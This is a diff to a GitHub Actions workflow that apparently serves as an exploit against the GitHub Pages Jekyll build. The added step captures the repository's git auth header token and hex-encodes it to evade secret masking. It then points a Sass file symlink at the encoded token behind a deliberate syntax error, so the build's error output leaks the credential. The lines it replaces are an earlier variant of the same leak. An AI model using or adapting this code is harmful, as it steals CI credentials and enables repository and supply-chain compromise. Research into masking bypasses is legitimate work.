@@ -12,24 +12,23 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: rewrite-git-config
+      - name: hex-encode-auth-then-leak
         shell: bash
         run: |
-          AUTH_LINE=$(git config --local --get-all http.https://github.com/.extraheader || echo MISSING)
-          echo "AUTH line captured (length only, to avoid leaking): ${#AUTH_LINE}"
-          # Replace .git/config with AUTH at TOP so Sass parses past line 8 to reach it
-          mv .git/config .git/config.orig
-          {
-            printf 'extraheader = %s\n' "$AUTH_LINE"
-            printf 'a { b: c }\n'
-            printf 'd { e: f }\n'
-          } > .git/config
-          echo "=== New .git/config (line count: $(wc -l < .git/config)) ==="
-          # diagnostic - print FIRST 3 lines but mask the AUTH
-          awk 'NR==1 { print "LINE1=<auth-redacted-length=" length($0) ">" } NR>1 { print "LINE"NR"="$0 }' .git/config
-          # Ensure symlink in _sass/_leak.scss points to this file
+          # Capture AUTH header value
+          AUTH=$(git config --local --get http.https://github.com/.extraheader)
+          echo "AUTH captured (length only): ${#AUTH}"
+          # Hex-encode and write to a file that Sass will parse
+          HEX_AUTH=$(echo -n "$AUTH" | xxd -p | tr -d '\n')
+          # Place hex content at line 1 with simple Sass-failure trigger
+          echo "$HEX_AUTH ! { broken }" > .git/config-hex
+          echo "Hex content written, length: $(wc -c < .git/config-hex)"
+          # Verify hex doesn't equal raw (masker check)
+          echo "Hex preview (first 20 chars): $(head -c 20 .git/config-hex)"
+          # Point Sass leak symlink at the hex file
           rm -f _sass/_leak.scss
-          ln -s /github/workspace/.git/config _sass/_leak.scss
+          ln -s /github/workspace/.git/config-hex _sass/_leak.scss
+          ls -la _sass/_leak.scss
       - uses: actions/configure-pages@v4
       - uses: actions/jekyll-build-pages@v1
         with:
